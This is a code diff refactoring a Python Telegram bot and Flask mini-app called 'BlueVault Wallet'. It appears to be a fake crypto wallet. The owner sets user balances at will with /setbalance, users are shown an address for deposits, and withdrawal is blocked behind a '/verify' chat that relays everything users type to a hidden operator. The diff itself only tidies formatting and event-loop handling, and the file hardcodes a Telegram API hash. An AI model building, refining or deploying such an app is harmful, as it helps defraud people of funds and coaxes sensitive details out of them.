@@ -1,13 +1,9 @@
 import asyncio
 import logging
 import os
-import nest_asyncio
 from threading import Thread
 from telethon import TelegramClient, events, Button
-from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from flask import Flask, request, jsonify
-
-nest_asyncio.apply()
 
 API_ID = 8
 API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
@@ -17,7 +13,10 @@ CRYPTO_ADDRESS = '0xYourAddress'
 
 logging.basicConfig(level=logging.INFO)
 
-bot = TelegramClient('bot_session', API_ID, API_HASH)
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
 app = Flask(__name__)
 user_balances = {}
 verification_sessions = {}
@@ -56,92 +55,19 @@ HTML_PAGE = '''
             justify-content: space-between;
             margin-bottom: 24px;
         }
-        .logo {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--blue-light);
-            letter-spacing: -0.5px;
-        }
+        .logo { font-size: 20px; font-weight: 700; color: var(--blue-light); letter-spacing: -0.5px; }
         .logo span { color: var(--blue); }
-        .status {
-            width: 8px; height: 8px;
-            background: var(--green);
-            border-radius: 50%;
-            box-shadow: 0 0 6px var(--green);
-        }
-        .card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 12px;
-        }
-        .balance-label {
-            font-size: 13px;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-        }
-        .balance-value {
-            font-size: 42px;
-            font-weight: 700;
-            color: #fff;
-            line-height: 1;
-        }
-        .balance-usd {
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-top: 6px;
-        }
-        .actions {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 16px;
-        }
-        .btn {
-            background: var(--card);
-            border: 1px solid var(--border);
-            color: var(--blue-light);
-            padding: 14px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            text-align: center;
-        }
-        .btn:active {
-            background: var(--border);
-            transform: scale(0.98);
-        }
-        .notice {
-            background: var(--card);
-            border: 1px solid var(--blue);
-            border-radius: 12px;
-            padding: 16px;
-            text-align: center;
-            color: var(--blue-light);
-            font-size: 14px;
-            margin-top: 12px;
-        }
-        .address-box {
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 14px;
-            font-size: 13px;
-            word-break: break-all;
-            color: var(--text-secondary);
-            margin: 12px 0;
-            font-family: 'SF Mono', 'Menlo', monospace;
-        }
-        .divider {
-            height: 1px;
-            background: var(--border);
-            margin: 16px 0;
-        }
+        .status { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 6px var(--green); }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 12px; }
+        .balance-label { font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .balance-value { font-size: 42px; font-weight: 700; color: #fff; line-height: 1; }
+        .balance-usd { font-size: 14px; color: var(--text-secondary); margin-top: 6px; }
+        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+        .btn { background: var(--card); border: 1px solid var(--border); color: var(--blue-light); padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; text-align: center; }
+        .btn:active { background: var(--border); transform: scale(0.98); }
+        .notice { background: var(--card); border: 1px solid var(--blue); border-radius: 12px; padding: 16px; text-align: center; color: var(--blue-light); font-size: 14px; margin-top: 12px; }
+        .address-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 14px; font-size: 13px; word-break: break-all; color: var(--text-secondary); margin: 12px 0; font-family: monospace; }
+        .divider { height: 1px; background: var(--border); margin: 16px 0; }
         .hidden { display: none; }
     </style>
 </head>
@@ -174,26 +100,21 @@ HTML_PAGE = '''
     <div id="withdrawScreen" class="hidden">
         <div class="card">
             <div class="balance-label">Withdraw</div>
-            <div class="notice">
-                ⚠ Complete verification in the bot using <b>/verify</b> command
-            </div>
+            <div class="notice">⚠ Complete verification in the bot using <b>/verify</b> command</div>
             <div class="divider"></div>
             <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
         </div>
     </div>
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.ready();
+        const tg = window.Telegram.WebApp; tg.expand(); tg.ready();
         const userId = tg.initDataUnsafe?.user?.id || 0;
         function updateBalance() {
-            fetch('/get_balance?user_id=' + userId)
-                .then(r => r.json())
-                .then(d => { document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2); })
-                .catch(() => {
-                    document.getElementById('statusDot').style.background = 'var(--red)';
-                    document.getElementById('statusDot').style.boxShadow = '0 0 6px var(--red)';
-                });
+            fetch('/get_balance?user_id=' + userId).then(r => r.json()).then(d => {
+                document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2);
+            }).catch(() => {
+                document.getElementById('statusDot').style.background = 'var(--red)';
+                document.getElementById('statusDot').style.boxShadow = '0 0 6px var(--red)';
+            });
         }
         function showStake() {
             document.getElementById('mainScreen').classList.add('hidden');
@@ -214,13 +135,11 @@ HTML_PAGE = '''
             document.getElementById('withdrawScreen').classList.add('hidden');
         }
         function copyAddress() {
-            const addr = document.getElementById('cryptoAddress').textContent;
-            navigator.clipboard.writeText(addr).then(() => {
+            navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(() => {
                 tg.showPopup({ title: 'Copied', message: 'Address copied to clipboard' });
             });
         }
-        updateBalance();
-        setInterval(updateBalance, 15000);
+        updateBalance(); setInterval(updateBalance, 15000);
     </script>
 </body>
 </html>
@@ -243,15 +162,11 @@ def get_address():
 async def start(event):
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
-    await event.respond(
-        '🛡 BlueVault Wallet',
-        buttons=[[Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')]]
-    )
+    await event.respond('🛡 BlueVault Wallet', buttons=[[Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')]])
 
 @bot.on(events.NewMessage(pattern='/setbalance'))
 async def set_balance(event):
-    if event.sender_id != OWNER_ID:
-        return
+    if event.sender_id != OWNER_ID: return
     try:
         _, target_id, amount = event.text.split()
         target_id, amount = int(target_id), float(amount)
@@ -266,12 +181,10 @@ async def myid(event):
 
 @bot.on(events.NewMessage(pattern='/msg'))
 async def msg(event):
-    if event.sender_id != OWNER_ID:
-        return
+    if event.sender_id != OWNER_ID: return
     try:
         parts = event.text.split(maxsplit=2)
-        target_id = int(parts[1])
-        message = parts[2] if len(parts) > 2 else ''
+        target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
         await bot.send_message(target_id, message)
         await event.respond('Sent')
     except:
@@ -282,21 +195,18 @@ async def verify(event):
     user_id = event.sender_id
     verification_sessions[user_id] = True
     await event.respond('✅ Verification started. Send your messages below.')
-    await bot.send_message(OWNER_ID, f'#VERIFY\nUser {user_id} started verification.')
+    await bot.send_message(OWNER_ID, f'#VERIFY User {user_id} started verification.')
 
-@bot.on(events.NewMessage(func=lambda e: e.sender_id in verification_sessions and not e.text.startswith('/')))
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in verification_sessions and e.text and not e.text.startswith('/')))
 async def handle_verification(event):
-    user_id = event.sender_id
-    await bot.send_message(OWNER_ID, f'#VERIFY_MSG\nFrom: {user_id}\nMessage: {event.text}\n\nReply: /reply {user_id} <text>')
+    await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {event.text}\n\nReply: /reply {event.sender_id} <text>')
 
 @bot.on(events.NewMessage(pattern='/reply'))
 async def reply(event):
-    if event.sender_id != OWNER_ID:
-        return
+    if event.sender_id != OWNER_ID: return
     try:
         parts = event.text.split(maxsplit=2)
-        target_id = int(parts[1])
-        message = parts[2] if len(parts) > 2 else ''
+        target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
         await bot.send_message(target_id, f'🛡 Operator: {message}')
         await event.respond('Replied')
     except:
@@ -304,12 +214,11 @@ async def reply(event):
 
 @bot.on(events.NewMessage(pattern='/endverify'))
 async def end_verify(event):
-    if event.sender_id != OWNER_ID:
-        return
+    if event.sender_id != OWNER_ID: return
     try:
         target_id = int(event.text.split()[1])
         verification_sessions.pop(target_id, None)
-        await bot.send_message(target_id, '✅ Verification completed. You can now proceed.')
+        await bot.send_message(target_id, '✅ Verification completed.')
         await event.respond(f'Ended for {target_id}')
     except:
         await event.respond('/endverify <id>')
@@ -323,4 +232,4 @@ def run_flask():
 
 if __name__ == '__main__':
     Thread(target=run_flask, daemon=True).start()
-    asyncio.get_event_loop().run_until_complete(main())
+    loop.run_until_complete(main())
